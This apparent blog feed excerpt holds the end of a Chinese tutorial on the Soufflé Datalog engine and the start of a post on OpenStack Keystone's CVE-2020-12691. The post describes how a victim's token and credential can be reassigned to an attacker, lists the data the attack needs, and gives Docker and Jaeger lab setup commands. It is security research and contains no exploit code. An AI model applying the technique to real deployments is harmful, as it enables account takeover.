class="symbol">A</span>(x,y), <span class="symbol">B</span>(y,z).</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">B</span>                    // <span class="symbol">Output</span> relation <span class="symbol">B</span> </span><br></pre></td></tr></table></figure><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><p>Soufflé 要求声明关系，关系是一组有有序元组 <code>(x1, ..., xk)</code>，其中每个元素 <code>xi</code> 都是由类型定义的数据域的成员。以下声明定义了仅包含数字对的关系 A，第一个属性被命名为 x，第二个属性被命名为 y，两个属性的类型都是数字。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number).</span><br></pre></td></tr></table></figure><p>Soufflé 的类型检查器将推断规则中的变量类型，并检查它们是否正确使用。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>Soufflé 利用类型化的 Datalog 方言进行静态检查，从而能够提早发现查询规范中的错误。必须为关系的任何属性指定类型，Soufflé 中有四种原始类型：符号（<code>symbol</code>）、数字（<code>number</code>）、无符号数字（<code>unsigned</code>）、浮点数（<code>float</code>）。</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>规则是条件逻辑语句，以头部开始，然后是身体。例如，如果一对 (x, y) 在 B 中则 A 成立：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">A</span>(x,y) :- <span class="symbol">B</span>(x,y).</span><br></pre></td></tr></table></figure><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><p>Soufflé 有组件这个概念，可用于模块化大型逻辑程序。一个组件可能包含其他组件、关系、类型声明、事实、规则和指令；组件必须声明和实例化后才可以使用，每个组件都有自己的命名空间；组件可以继承一个或多个超级组件。</p><h3 id="用户定义函子"><a href="#用户定义函子" class="headerlink" title="用户定义函子"></a>用户定义函子</h3><p>可以使用用户定义函子扩展 Soufflé，用户定义函子用 C&#x2F;C++ 实现。用户定义函子有两种风格：朴素函子和有状态的函子，有状态的函子公开记录和符号表。</p><h3 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h3><p>用编译指令配置 Soufflé，例如，可以在源码中设置命令行选项。</p><h2 id="组件-Components"><a href="#组件-Components" class="headerlink" title="组件 Components"></a>组件 Components</h2><p>组件是程序的模块化部分，可以封装元素，包括关系声明、类型声明、规则、事实、指令和其他组件。组件包含声明和实例化两个操作。</p><p>使用 <code>.comp</code> 关键字声明组件，组件包含的元素定义在 <code>&#123;...&#125;</code> 内：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">MyComponent</span> &#123;</span><br><span class="line">    .type myType = number        // type</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>.init</code> 关键字初始化组件，在内部，Soufflé 将组件实例扁平化（flatten），并为每个组件实例创建命名空间，因此要用限定名称调用其中的元素。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span>         // 实例化</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).    // . 限定</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>对于上面的例子，Soufflé 在内部对组件实例进行了如下扩展：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>可以使用 <code>souffle --show=transformed-datalog xxx.dl &gt; expansion.dl</code> 生成扩展后的 datalog 文件。</p><p>下面定义了两个 MyComponent 实例：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span></span><br><span class="line">.init myInstance2 = <span class="symbol">MyComponent</span></span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>Soufflé 在内部生成以下逻辑程序，通过前缀避免名称冲突：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">.type myInstance2.myType = number</span><br><span class="line">.decl myInstance2.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>如果规则&#x2F;事实在没有关系声明的组件中定义，Soufflé 不会预先添加前缀，而是会将解析推迟到实际的组件实例化。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.comp <span class="symbol">A</span> &#123; </span><br><span class="line">   .decl <span class="symbol">R</span>(x:number) </span><br><span class="line">   .comp <span class="symbol">Count</span> &#123;              // 在组件内部定义组件</span><br><span class="line">       <span class="symbol">R</span>(<span class="number">1</span>).                  // fact accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">       <span class="symbol">R</span>(x+<span class="number">1</span>):- <span class="symbol">R</span>(x), x&lt;<span class="number">10.</span>   // rule accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">   &#125; </span><br><span class="line">   .init myCount = <span class="symbol">Count</span>      // instantiate <span class="symbol">Count</span></span><br><span class="line">   <span class="symbol">Out</span>(x) :- <span class="symbol">R</span>(x).            // rule accessing <span class="symbol">Out</span> outside of <span class="symbol">A</span> </span><br><span class="line">&#125;</span><br><span class="line">.init myA = <span class="symbol">A</span></span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>Soufflé 会将代码扩展，实际会是这样：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.decl myA.<span class="symbol">R</span>(x:number) </span><br><span class="line">myA.<span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">myA.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- myA.<span class="symbol">R</span>(x), x &lt; <span class="number">10.</span></span><br><span class="line"><span class="symbol">Out</span>(x) :- </span><br><span class="line">   myA.<span class="symbol">R</span>(x).</span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>如果规则和事实在本地作用域中被实例化，那么前缀将被预先添加到前面。</p><h3 id="类型参数化"><a href="#类型参数化" class="headerlink" title="类型参数化"></a>类型参数化</h3><p>组件可以通过未限定的类型名称进行参数化，下面的例子实例化了两个不同的类型的组件：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">ParamComponent</span>&lt;myType&gt; &#123;</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">    .output <span class="symbol">TheAnswer</span>            // component output directive</span><br><span class="line">&#125;</span><br><span class="line">.init numberInstance = <span class="symbol">ParamComponent</span>&lt;number&gt;</span><br><span class="line">.init floatInstance = <span class="symbol">ParamComponent</span>&lt;float&gt;</span><br></pre></td></tr></table></figure><p>在内部，Soufflé 将显式实例化不同属性的组件：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl numberInstance.<span class="symbol">TheAnswer</span>(x:number)     // relation of numberInstance</span><br><span class="line">numberInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                // fact of numberInstance</span><br><span class="line">.output numberInstance.<span class="symbol">TheAnswer</span>             // output directive of numberInstance</span><br><span class="line"></span><br><span class="line">.decl floatInstance.<span class="symbol">TheAnswer</span>(x:float)       // relation of floatInstance</span><br><span class="line">floatInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                 // fact of floatInstance</span><br><span class="line">.output floatInstance.<span class="symbol">TheAnswer</span>              // output directive of floatInstance</span><br></pre></td></tr></table></figure><p>组件名称也可以用参数传递，例如，实例化时指定生成组件 One：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number)</span><br><span class="line">.comp <span class="symbol">Case</span>&lt;<span class="symbol">Selector</span>&gt; &#123;</span><br><span class="line">   .comp <span class="symbol">One</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">   &#125; </span><br><span class="line">   .comp <span class="symbol">Two</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">   &#125; </span><br><span class="line">   .init selection = <span class="symbol">Selector</span> // instantiation depending on type parameter <span class="string">&quot;Selector&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line">.init myCase = <span class="symbol">Case</span>&lt;<span class="symbol">One</span>&gt; </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>在内部将生成以下程序：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number) </span><br><span class="line"><span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>一个组件可以继承多个超级组件，超级组件的元素将被传递给子组件。使用 <code>:</code> 继承超级组件，用 <code>,</code> 分隔：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base1</span> &#123;</span><br><span class="line">    .type myNumber = number</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myNumber)</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Base2</span> &#123; </span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">41</span>). </span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span>  : <span class="symbol">Base1</span>, <span class="symbol">Base2</span> &#123; // inherit from <span class="symbol">Base1</span> and <span class="symbol">Base2</span></span><br><span class="line">    .decl <span class="symbol">WhatIsTheAnswer</span>(n:myNumber)</span><br><span class="line">    <span class="symbol">WhatIsTheAnswer</span>(n) :- <span class="symbol">TheAnswer</span>(n).</span><br><span class="line">    .output <span class="symbol">WhatIsTheAnswer</span></span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>组件 Base1 和 Base2 将所有组件元素传递给子组件 Sub，在内部实例化 mySub 时生成以下代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type mySub.myNumber = number</span><br><span class="line">.decl mySub.<span class="symbol">TheAnswer</span>(x:mySub.myNumber) </span><br><span class="line">.decl mySub.<span class="symbol">WhatIsTheAnswer</span>(n:mySub.myNumber) </span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">41</span>).</span><br><span class="line">mySub.<span class="symbol">WhatIsTheAnswer</span>(n) :- mySub.<span class="symbol">TheAnswer</span>(n).</span><br><span class="line">.output mySub.<span class="symbol">WhatIsTheAnswer</span></span><br></pre></td></tr></table></figure><h3 id="可重写的关系"><a href="#可重写的关系" class="headerlink" title="可重写的关系"></a>可重写的关系</h3><p>如果在超级组件中将关系声明为可覆盖（<code>overridable</code>），则子组件可以重写关联的规则和事实。例如</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base</span> &#123;</span><br><span class="line">    .decl <span class="symbol">R</span>(x:number) overridable</span><br><span class="line">    <span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">5.</span> </span><br><span class="line">    .output <span class="symbol">R</span></span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span> : <span class="symbol">Base</span> &#123;</span><br><span class="line">    .override <span class="symbol">R</span></span><br><span class="line">    <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">4.</span> </span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>子组件丢弃事实 <code>R(1).</code> 和规则 <code>R(x+1) :- R(x), x &lt; 5.</code>，然后进行重写，在内部实例化 mySub 时生成以下代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl mySub.<span class="symbol">R</span>(x:number)overridable </span><br><span class="line">mySub.<span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">mySub.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- </span><br><span class="line">   mySub.<span class="symbol">R</span>(x),</span><br><span class="line">   x &lt; <span class="number">4.</span></span><br><span class="line">.output mySub.<span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>例如，可以用 PrecisePointsto 继承和覆盖 AbstractPointsto 的 HeapAllocationMerge 关系，实现更精确的分析：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">AbstractPointsto</span>&#123;</span><br><span class="line">    .decl <span class="symbol">HeapAllocationMerge</span>(heap,mergeHeap) overridable</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap).</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.comp <span class="symbol">PrecisePointsto</span> : <span class="symbol">AbstractPointsto</span>&#123;   // 继承</span><br><span class="line">    .override <span class="symbol">HeapAllocationMerge</span>           // 覆盖</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">ClassNameStringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">SimpleNameStringConstant</span>(heap).</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.init precise_pointsto = <span class="symbol">PrecisePointsto</span></span><br></pre></td></tr></table></figure><h3 id="类型参数化和继承"><a href="#类型参数化和继承" class="headerlink" title="类型参数化和继承"></a>类型参数化和继承</h3><p>超级组件的类型参数可以在子组件声明中明确指定，下面定义了一个带参数 K 的子组件 B，用于实例化带参数 K 的超组件 A：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; &#123; .... &#125;</span><br><span class="line">.comp <span class="symbol">B</span>&lt;<span class="symbol">K</span>&gt; : <span class="symbol">A</span>&lt;<span class="symbol">K</span>&gt; &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>类型参数也可以用作基类，基于类型参数 T 选择性继承，<code>A&lt;T&gt;</code> 的实例定义继承的超级组件：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; : <span class="symbol">T</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>通过继承，可以实现复杂的组件实例化，注意这里要引入一个新的组件，因为参数 <code>Graph&lt;number&gt;</code> 不是简单的标识符：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 错误</span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">Graph</span>&lt;number&gt;&gt;   // syntax error</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">.comp <span class="symbol">NumberGraph</span> : <span class="symbol">Graph</span>&lt;number&gt; &#123; &#125; // <span class="symbol">NumberGraph</span> inherits  </span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">NumberGraph</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="编译指令-Pragma"><a href="#编译指令-Pragma" class="headerlink" title="编译指令 Pragma"></a>编译指令 Pragma</h2><p>允许直接在源码中设置命令行标志和配置，例如下面的代码将在调用 souffle 时指定 <code>--legacy</code> 标志：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.pragma <span class="string">&quot;legacy&quot;</span> </span><br><span class="line">.decl <span class="symbol">A</span>(x:number) output</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br></pre></td></tr></table></figure><p>有一些配置不能用命令行标志设置，因此也就不能用这种方法设置。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>想更深入地了解 Datalog 可以看看 <a href="http://blogs.evergreen.edu/sosw/files/2014/04/Green-Vol5-DBS-017.pdf">Datalog and Recursive Query Processing</a>，还有学长推荐的 <a href="https://www.jianshu.com/p/d7598d17ff2b">Dimension Shift! 一起来学Datalog吧！</a>，这方面我倒是没有扩展地去看；Doop 框架的提出可以看 <a href="https://www.researchgate.net/publication/221321022_Strictly_Declarative_Specification_of_Sophisticated_Points-to_Analyses">Strictly Declarative Specification of Sophisticated Points-to Analyses</a>，具体的指针分析实现可以参考 <a href="http://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a>。</p><p>Doop 虽然很强大，但是学起来比较困难，而且我还没什么 Java 基础… 费劲。</p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://bitbucket.org/yanniss/doop/src/master/">doop</a></li><li><a href="https://souffle-lang.github.io/index.html">Soufflé | Soufflé • A Datalog Synthesis Tool for Static Analysis</a></li></ul>]]></content>
    
    
    <summary type="html">开源引擎 Soufflé 介绍及使用</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-12691 漏洞利用相关信息追踪</title>
    <link href="https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/"/>
    <id>https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/</id>
    <published>2021-11-05T07:25:15.000Z</published>
    <updated>2023-03-06T15:01:58.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>5.14 的时候就写好了，就是一直没发（摊手</p><p>使用 Victoria 版本的 Keystone（<a href="https://tarballs.openstack.org/keystone/keystone-18.0.0.tar.gz">18.0.0</a>）不能复现漏洞利用，但是可以获取漏洞利用过程中所需的相关信息。</p><ul><li>该漏洞可以在 <a href="https://tarballs.openstack.org/keystone/keystone-16.0.0.tar.gz">Keystone 16.0.0</a> 上进行利用</li></ul><p>该漏洞的原理是使用受害者的 X-Subject-Token、credential，将其 credential 对应的 user_id、project_id 替换为攻击者的，攻击者因此获得了 credential 的使用权，进而使用该 credential 请求受害者所有的资源。漏洞利用所需的信息包括：</p><ul><li>user_id</li><li>project_id</li><li>credential</li><li>X-Subject-Token</li></ul><h1 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h1><h2 id="令牌（Token）"><a href="#令牌（Token）" class="headerlink" title="令牌（Token）"></a>令牌（Token）</h2><p>一旦用户的凭据（credential）通过验证，令牌服务验证和管理用于发起授权请求的令牌。</p><p>下图是请求 token 的时序图，<strong>在 v3 版本的 API 中，token 在 HTTP 头部的 X-Subject-Token 字段中，而且作为 HTTP 头部的 X-Auth-Token 字段，用以向其他服务提供认证。</strong></p><img src="https://i.loli.net/2021/11/05/PMkbSVJxoEDevWm.png" width="80%"><h2 id="应用程序凭据（Application-Credential）"><a href="#应用程序凭据（Application-Credential）" class="headerlink" title="应用程序凭据（Application Credential）"></a>应用程序凭据（Application Credential）</h2><p>用户可以创建应用凭据来允许其应用向 Keystone 进行认证，用户可以将其在项目上的角色分配的子集委托给应用程序凭据。应用使用凭据（而不是用户名密码）进行身份认证。</p><p>EC2 credential 允许用户通过 Amazon S3 API 访问 OpenStack 资源。</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>使用 Virtualbox 虚拟机安装 Ubuntu 18.04；然后再安装 Docker 和 Jaeger 相关的 Python 库。</p><ol><li>安装 Docker</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> containerd.service</span><br></pre></td></tr></table></figure><ol start="2"><li>安装 Docker Compose（虽然没用到xd）</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.28.6/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 pip 安装 Jaeger 相关的库</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 库</span></span><br><span class="line">pip install jaeger_client</span><br><span class="line">pip install opentracing</span><br></pre></td></tr></table></figure><ol start="4"><li>启动 all-in-one 镜像</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull jaegertracing/all-in-one</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建容器</span></span><br><span 